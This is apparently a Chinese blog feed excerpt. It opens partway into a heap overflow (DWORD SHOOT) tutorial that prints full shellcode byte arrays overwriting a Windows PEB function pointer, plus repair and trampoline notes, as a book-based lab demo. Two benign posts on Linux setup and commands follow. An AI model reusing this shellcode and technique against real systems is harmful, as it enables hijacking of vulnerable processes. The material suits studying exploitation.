class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x16\x01\x1A\x00\x00\x10\x00\x00&quot;</span><span class="comment">// head of the ajacent free block</span></span><br><span class="line"><span class="string">&quot;\x88\x06\x36\x00\x20\xf0\xfd\x7f&quot;</span>;</span><br></pre></td></tr></table></figure><p>运行一下，发现那个 failwest 消息框没有弹出来。原来，这里有一个问题：<br>**被我们修改的 P.E.B 里的函数指针不光会被 ExitProcess()调用， shellcode 中的函数也会使用。**当 shellcode 的函数使用临界区时，会像 ExitProcess()一样被骗。</p><p>为了解决这个问题，我们对 shellcode 稍加修改，在一开始就把我们 DWORD SHOOT 的指针修复回去，以防出错。重新调试一遍，记下 <code>0x7FFDF020</code> 处的函数指针为 <code>0x77F82060</code>。</p><blockquote><p><strong>提示：</strong><br>P.E.B 中存放 RtlEnterCriticalSection() 函数指针的位置 0x7FFDF020 是固定的，但是， RtlEnterCriticalSection() 的地址也就是这个指针的值 0x77F82060 有可能会因为补丁和操作系统而不一样，请在动态调试时确定。</p></blockquote><p>指令与对应机器码</p><table><thead><tr><th>指 令</th><th>机 器 码</th></tr></thead><tbody><tr><td>MOV EAX,7FFDF020</td><td>“\xB8\x20\xF0\xFD\x7F”</td></tr><tr><td>MOV EBX,77F82060（可能需要调试确定这个地址）</td><td>“\xBB\x60\x20\xF8\x77”</td></tr><tr><td>MOV [EAX],EBX</td><td>“\x89\x18”</td></tr></tbody></table><p>将这 3 条指令的机器码放在 shellcode 之前，重新调整 shellcode 的长度为 200 字节，然后是 8 字节块首， 8 字节伪造的指针。</p><p>这时，缓冲区内容如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//repaire the pointer which shooted by heap over run</span></span><br><span class="line"><span class="string">&quot;\xB8\x20\xF0\xFD\x7F&quot;</span>  <span class="comment">//MOV EAX,7FFDF020</span></span><br><span class="line"><span class="string">&quot;\xBB\x60\x20\xF8\x77&quot;</span>  <span class="comment">//MOV EBX,77F8AA4C the address here may releated to your OS</span></span><br><span class="line"><span class="string">&quot;\x89\x18&quot;</span><span class="comment">//MOV DWORD PTR DS:[EAX],EBX</span></span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x16\x01\x1A\x00\x00\x10\x00\x00&quot;</span><span class="comment">// head of the ajacent free block</span></span><br><span class="line"><span class="string">&quot;\x88\x06\x36\x00\x20\xf0\xfd\x7f&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//0x00360688 is the address of shellcode in first heap block, you have to make sure this address via debug </span></span><br><span class="line"><span class="comment">//0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()</span></span><br><span class="line"><span class="comment">//and will be called by ExitProcess() at last</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>现在把断点注释掉，build直接运行。结果如下图所示，注入成功！！！<br><img src="/2022/04/15/%E5%A0%86%E6%BA%A2%E5%87%BA/image-20220415152912303-165052222800441.png" alt="注入成功"></p><h1 id="堆溢出利用的注意事项"><a class="markdownIt-Anchor" href="#堆溢出利用的注意事项"></a> 堆溢出利用的注意事项</h1><h2 id="调试堆与常态堆的区别"><a class="markdownIt-Anchor" href="#调试堆与常态堆的区别"></a> 调试堆与常态堆的区别</h2><p>（1）调试堆不使用快表，只用空表分配。<br>（2）所有堆块都被加上了多余的 16 字节尾部用来防止溢出（防止程序溢出而不是堆溢出攻击），这包括 8 个字节的 0xAB 和 8 个字节的 0x00。<br>（3）块首的标志位不同。</p><h2 id="在-shellcode-中修复环境"><a class="markdownIt-Anchor" href="#在-shellcode-中修复环境"></a> 在 shellcode 中修复环境</h2><p>比较简单<strong>修复堆区</strong>的做法包括如下步骤。<br>（1）在堆区偏移 <code>0x28</code>的地方存放着堆区所有空闲块的总和 TotalFreeSize。<br>（2）把一个较大块（或干脆直接找个暂时不用的区域伪造一个块首）块首中标识自身大小的两个字节（self size）修改成堆区空闲块总容量的大小(TotalFreeSize）。<br>（3）把该块的 flag 位设置为 0x10（last entry 尾块）。<br>（4）把 freelist[0]的前向指针和后向指针都指向这个堆块。<br>这样可以使整个堆区“看起来好像是”刚初始化完只有一个大块的样子，不但可以继续完成分配工作，还保护了堆中已有的数据。</p><h2 id="定位-shellcode-的跳板"><a class="markdownIt-Anchor" href="#定位-shellcode-的跳板"></a> 定位 shellcode 的跳板</h2><p>可以使用几种指令作为<strong>跳板</strong>定位 shellcode，这些指令一般可以在 netapi32.dll、 user32.dll、 rp crt4.dll 中搜到不少，代码如下所示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CALL DWORD PTR [EDI+0x78]</span><br><span class="line">CALL DWORD PTR [ESI+0x4C]</span><br><span class="line">CALL DWORD PTR [EBP+0x74]  </span><br></pre></td></tr></table></figure><h2 id="dword-shoot-后的指针反射现象"><a class="markdownIt-Anchor" href="#dword-shoot-后的指针反射现象"></a> DWORD SHOOT 后的“指针反射”现象</h2><p>回顾前面介绍 DWORD SHOOT 时所举的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">remove</span> <span class="params">(ListNode * node)</span></span><br><span class="line">&#123;</span><br><span class="line">node -&gt; blink -&gt; flink = node -&gt; flink;</span><br><span class="line">node -&gt; flink -&gt; blink = node -&gt; blink;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中， <code>node -&gt; blink(fake) -&gt; flink = node -&gt; flink(fake);</code> 将会导致 DWORD SHOOT。你可能会发现<code>node -&gt; flink(fake) -&gt; blink = node -&gt; blink(fake);</code> 也能导致 DWORD SHOOT。这次 DWORD SHOOT 将把目标地址写回 shellcode 起始位置偏移 4 个字节的地方。我把类似这样的第二次 DWORD SHOOT 称为 “<strong>指针反射</strong>”。</p><p>有时在指针反射发生前就会产生异常。然而，大多数情况下，指针反射是会发生的，糟糕的是，它会<strong>把目标地址刚好写进 shellcode 中</strong>。这对于没有跳板直接利用 DWORD SHOOT 劫持进程的 exploit 来说是一个很大的限制，因为它将破坏 4 个字节的 shellcode。</p><p>幸运的是，很多情况下 4 个字节的目标地址都会被处理器当做“无关痛痒”的指令安全地执行过去。</p><hr><blockquote><p>参考：</p><p>《0day,软件安全漏洞分析技术》</p></blockquote><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;如果你不了解堆的话，请先看我的上一篇博文《堆的工作原理》，然后再来学习堆溢出，结合食用，更易理解。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;堆溢出利用上-dword-shoot&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot;</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="堆" scheme="https://www.rgzzplus.com/tags/%E5%A0%86/"/>
    
  </entry>
  
  <entry>
    <title>使用linux时的问题总结</title>
    <link href="https://www.rgzzplus.com/2022/04/10/%E4%BD%BF%E7%94%A8linux%E6%97%B6%E7%9A%84%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    <id>https://www.rgzzplus.com/2022/04/10/%E4%BD%BF%E7%94%A8linux%E6%97%B6%E7%9A%84%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/</id>
    <published>2022-04-10T06:39:47.000Z</published>
    <updated>2022-04-17T06:23:08.055Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h1 id="vim-etc-写入时-出现-e121无法打开并写入文件"><a class="markdownIt-Anchor" href="#vim-etc-写入时-出现-e121无法打开并写入文件"></a> vim /etc 写入时 出现 E121:无法打开并写入文件</h1><p><strong>解决方案：</strong></p><ol><li>保存的时候用:w !sudo tee %</li><li>输入密码，即可</li></ol><h1 id="安装中文输入法"><a class="markdownIt-Anchor" href="#安装中文输入法"></a> 安装中文输入法</h1><h2 id="安装步骤"><a class="markdownIt-Anchor" href="#安装步骤"></a> 安装步骤</h2><p>1.更新源文件，使用的是阿里云源</p><p>打开<strong>sources.list</strong>文件</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leafpad /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>复制源地址到文本中</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb https://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><p>更新安装源</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure><p>2.下载IBus完后重启系统</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ibus</span><br><span class="line">apt-get install ibus-pinyin</span><br><span class="line">reboot //重启</span><br></pre></td></tr></table></figure><p>3.IBus配置<br>鼠标右键选择设置(setting)&gt;区域和语言(Region&amp;Language),在输入源中添加汉语（PinYin），可通过搜索PinYin找到。</p><h1 id="linux-编程"><a class="markdownIt-Anchor" href="#linux-编程"></a> Linux 编程</h1><h2 id="gcc-多线程编译失败"><a class="markdownIt-Anchor" href="#gcc-多线程编译失败"></a> gcc 多线程编译失败</h2><p><img src="/2022/04/10/%E4%BD%BF%E7%94%A8linux%E6%97%B6%E7%9A%84%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/image-20220403144624296-16501645035061.png" alt="image-20220403144624296"></p><p>今天写一个线程的程序，已经在c文件中包含了线程的头文件&lt;pthread.h&gt;，可是编译的时候却报错“对pthread_create未定义的引用“，原来时因为 pthread库不是Linux系统默认的库，连接时需要使用库libpthread.a,所以在使用pthread_create创建线程时，在编译中要加-lpthread参数:gcc createThread.c -lpthread -o createThread. 加上这个以后编译成功！</p><p><img src="/2022/04/10/%E4%BD%BF%E7%94%A8linux%E6%97%B6%E7%9A%84%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/image-20220403144755741-16501645035062.png" alt="image-20220403144755741"></p><p><img src="/2022/04/10/%E4%BD%BF%E7%94%A8linux%E6%97%B6%E7%9A%84%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/image-20220403152451357-16501645035064.png" alt="image-20220403152451357"></p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="comment">//线程创建相关函数</span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_t</span> tid;   <span class="comment">//创建线程 ID</span></span><br><span class="line"></span><br><span class="line">pthread_create(&amp;tid, <span class="literal">NULL</span>,  threadFunc, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    线程创建函数，参数列表:</span></span><br><span class="line"><span class="comment">    1.  线程 ID 地址</span></span><br><span class="line"><span class="comment">    2.  线程 属性</span></span><br><span class="line"><span class="comment">    3.  线程 函数地址</span></span><br><span class="line"><span class="comment">    4.  线程 传递给线程函数的参数</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">pthread_join(tid, <span class="literal">NULL</span>);   <span class="comment">//等待指定的线程结束</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line">&#123;<span class="comment">//统计程序运行时间</span></span><br><span class="line"></span><br><span class="line"><span class="type">clock_t</span> start,delta;</span><br><span class="line"><span class="type">double</span> time_used;<span class="comment">//程序开头加上这两行代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">程序变量在这里定义</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">start = clock();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">程序执行代码放在这里</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">delta = clock() - start;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The time taken in total : %lf seconds\n&quot;</span>,(<span class="type">double</span>)delta/CLOCKS_PER_SEC); <span class="comment">//程序末尾输出运行时间</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//统计程序时间，除了在代码中统计外，还能再运行程序前加上 [time ./程序名] ,让系统去统计</span></span><br></pre></td></tr></table></figure><h2 id="互斥锁"><a class="markdownIt-Anchor" href="#互斥锁"></a> 互斥锁</h2><p><img src="/2022/04/10/%E4%BD%BF%E7%94%A8linux%E6%97%B6%E7%9A%84%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/image-20220404145450778-16501645035063.png" alt="image-20220404145450778"></p><h2 id="信号量"><a class="markdownIt-Anchor" href="#信号量"></a> 信号量</h2><p><img src="/2022/04/10/%E4%BD%BF%E7%94%A8linux%E6%97%B6%E7%9A%84%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/image-20220404195520172-16501645035065.png" alt="image-20220404195520172"></p><p><img src="/2022/04/10/%E4%BD%BF%E7%94%A8linux%E6%97%B6%E7%9A%84%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/image-20220405143220745-16501645035066.png" alt="image-20220405143220745"></p><p><img src="/2022/04/10/%E4%BD%BF%E7%94%A8linux%E6%97%B6%E7%9A%84%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/image-20220405143628664-16501645035067.png" alt="image-20220405143628664"></p><blockquote><p>参考：<a href="https://www.bilibili.com/video/BV1bf4y147PZ?p=1">《操作系统原理及Linux实践》</a></p></blockquote></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;h1 id=&quot;vim-etc-写入时-出现-e121无法打开并写入文件&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#vim-etc-写入时-出现-e121无法打开并写入文件&quot;&gt;&lt;/a&gt; vim /etc 写入时 出现 E1</summary>
      
    
    
    
    <category term="经验交流" scheme="https://www.rgzzplus.com/categories/%E7%BB%8F%E9%AA%8C%E4%BA%A4%E6%B5%81/"/>
    
    
    <category term="linux问题" scheme="https://www.rgzzplus.com/tags/linux%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>linux命令行</title>
    <link href="https://www.rgzzplus.com/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/"/>
    <id>https://www.rgzzplus.com/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/</id>
    <published>2022-04-10T06:37:19.000Z</published>
    <updated>2022-04-10T06:42:17.539Z</updated>
    
    <content type="html"><![CDATA[<h1 id="apt-软件包管理服务"><a class="markdownIt-Anchor" href="#apt-软件包管理服务"></a> apt 软件包管理服务</h1><p>apt命令负责安装，更新，删除和管理基于Ubuntu和Debian的系统的软件包。</p><h2 id="安装软件包"><a class="markdownIt-Anchor" href="#安装软件包"></a> 安装软件包</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">sudo apt install [package name1] [package-name2] [package-name3]</span><br></pre></td></tr></table></figure><h2 id="卸载软件包"><a class="markdownIt-Anchor" href="#卸载软件包"></a> 卸载软件包</h2><p>这是使用apt命令从我们的系统中删除程序或服务的语法。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">sudo apt remove [package name]</span><br></pre></td></tr></table></figure><p>但是，即使已删除软件包，在安装的软件包中也会有一些孤立的文件。 在这种情况下，您可以使用“清除清除”选项。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">sudo apt --purge remove [package-name]</span><br></pre></td></tr></table></figure><h3 id="自动删除孤立的软件包"><a class="markdownIt-Anchor" href="#自动删除孤立的软件包"></a> 自动删除孤立的软件包</h3><p>删除软件包时，仅删除关键的依赖项。 其余的留在我们的系统中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">sudo apt autoremove</span><br></pre></td></tr></table></figure><p>上面的命令将从系统中卸载所有孤立的软件包。 这包括已安装为依赖项且不再需要的任何软件包。</p><h2 id="更新apt存储库"><a class="markdownIt-Anchor" href="#更新apt存储库"></a> 更新APT存储库</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><p>它检查在线存储库，并将所有更新的软件包下载到本地存储库。</p><h3 id="升级系统软件包"><a class="markdownIt-Anchor" href="#升级系统软件包"></a> 升级系统软件包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure><p>这将扫描系统上所有已安装的软件包，并找到在旧版本上运行的程序或服务。 接下来，它将所有此类程序和服务升级到最新的可用版本。</p><p>这是必不可少的命令，因为它使您可以使用单个命令来启动系统范围的升级。</p><p>但是上面的命令只会升级非关键软件包。 如果有可用的内核更新，则需要使用以下命令执行完整的系统升级：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">sudo apt full-upgrade</span><br></pre></td></tr></table></figure><p>上面的命令将升级Linux内核以及所有未使用先前命令升级的系统关键软件包。 全面升级后，通常需要重新启动，以便启动新内核。</p><h2 id="搜索包"><a class="markdownIt-Anchor" href="#搜索包"></a> 搜索包</h2><p><em>apt search</em>命令是用于在Ubuntu上搜索软件包的最常用命令。 它旨在搜索包名称及其元数据，例如描述，依赖项，源和版本。</p><p>该命令返回名称或元数据与指定搜索关键字匹配的所有软件包。 以下是使用apt search命令搜索软件包的语法。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt search [keyword]</span><br></pre></td></tr></table></figure><h1 id="探索-linux-系统"><a class="markdownIt-Anchor" href="#探索-linux-系统"></a> 探索 Linux 系统</h1><h2 id="选项与参数"><a class="markdownIt-Anchor" href="#选项与参数"></a> 选项与参数</h2><p>大多数命令格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">command</span> -options arguments</span><br></pre></td></tr></table></figure><p>-options</p><ul><li>-l用于产生长格式的输出结果</li><li>-t    用于按修改时间顺序对输出结果排序</li><li>–reverse    以降序排列输出结果</li></ul><h2 id="显示当前工作目录名称"><a class="markdownIt-Anchor" href="#显示当前工作目录名称"></a> 显示当前工作目录名称</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pwd</span></span><br></pre></td></tr></table></figure><h2 id="更改当前工作目录"><a class="markdownIt-Anchor" href="#更改当前工作目录"></a> 更改当前工作目录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> [绝对路径/相对路径]</span><br></pre></td></tr></table></figure><p><img src="/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/IMG_20220331_190859.jpg" alt="cd便捷写法"></p><h2 id="列出目录内容"><a class="markdownIt-Anchor" href="#列出目录内容"></a> 列出目录内容</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure><h3 id="ls-命令选项"><a class="markdownIt-Anchor" href="#ls-命令选项"></a> ls 命令选项</h3><p><img src="/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/IMG_20220331_191623.jpg" alt="ls 命令选项"></p><h3 id="进一步了解长格式"><a class="markdownIt-Anchor" href="#进一步了解长格式"></a> 进一步了解长格式</h3><p>ls -l 后的输出</p><p><img src="/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/image-20220331192208724.png" alt="ls -l 后的输出"></p><p>不同字段的含义：</p><p><img src="/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/IMG_20220331_191655.jpg" alt="不同字段的含义"></p><h2 id="使用-file-命令确定文件类型"><a class="markdownIt-Anchor" href="#使用-file-命令确定文件类型"></a> 使用 file 命令确定文件类型</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file filename</span><br></pre></td></tr></table></figure><h2 id="使用-less-命令查看文本文件"><a class="markdownIt-Anchor" href="#使用-less-命令查看文本文件"></a> 使用 less 命令查看文本文件</h2><p>less 命令进入文本后常用命令</p><p><img src="/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/IMG_20220331_191718.jpg" alt="less"></p><h2 id="复制粘贴技巧"><a class="markdownIt-Anchor" href="#复制粘贴技巧"></a> 复制粘贴技巧</h2><p>使用鼠标，双击可以复制文件名，单击中键可以将其粘贴到命令中。</p><p><img src="/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/IMG_20220331_191804_edit_460972879994762.jpg" alt="系统目录"></p><p><img src="/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/IMG_20220331_191837_edit_461000882512987.jpg" alt="IMG_20220331_191837_edit_461000882512987"></p><h2 id="符号链接"><a class="markdownIt-Anchor" href="#符号链接"></a> 符号链接</h2><p><img src="/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/image-20220331201930857.png" alt="image-20220331201930857"></p><p>第一个字母是 L ，表示一种特殊的文件叫符号链接（也叫软链接），在Unix中，一个文件可以被多个名称引用。</p><h1 id="操作文件和目录"><a class="markdownIt-Anchor" href="#操作文件和目录"></a> 操作文件和目录</h1><h2 id="通配符"><a class="markdownIt-Anchor" href="#通配符"></a> 通配符</h2><p>通配符，帮助快速指定一组文件名。</p><p><img src="/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/IMG_20220331_202606_edit_464545823869217.jpg" alt="通配符及其含义"></p><p><img src="/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/IMG_20220331_202615_edit_464532576105157.jpg" alt="常用字符类"></p><p><img src="/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/IMG_20220331_202628.jpg" alt="通配符示例"></p><h2 id="mkdir创建目录"><a class="markdownIt-Anchor" href="#mkdir创建目录"></a> mkdir—创建目录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> directory...</span><br></pre></td></tr></table></figure><h2 id="cp复制文件和目录"><a class="markdownIt-Anchor" href="#cp复制文件和目录"></a> cp—复制文件和目录</h2><p>将单个文件或目录 item1 复制到文件或目录 item2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> item1 item2</span><br></pre></td></tr></table></figure><p>将多个文件或目录 item 复制到目录 directoty 中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> item... directory</span><br></pre></td></tr></table></figure><p><strong>有用的选项和示例</strong></p><p><img src="/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/IMG_20220331_203549_edit_464995287133211.jpg" alt="cp命令常用选项"></p><p><img src="/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/IMG_20220331_203556_edit_464985633861337.jpg" alt="cp命令示例"></p><h2 id="mv移动和重命名文件"><a class="markdownIt-Anchor" href="#mv移动和重命名文件"></a> mv—移动和重命名文件</h2><p>将文件或目录 item1 移动或重命名为 item2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> item1 item2</span><br></pre></td></tr></table></figure><p>将一个或多个 item 从一个目录移动到另一个目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> item... directory</span><br></pre></td></tr></table></figure><p><img src="/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/IMG_20220331_204251_edit_465337159433680.jpg" alt="mv命令选项"></p><p><img src="/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/IMG_20220331_204334_edit_465371086991487.jpg" alt="mv命令示例"></p><h1 id="未完待续"><a class="markdownIt-Anchor" href="#未完待续"></a> 未完待续。。。</h1><blockquote><p>参考：《linux命令行大全》  第二版</p></blockquote>]]></content>
    
    
      
      
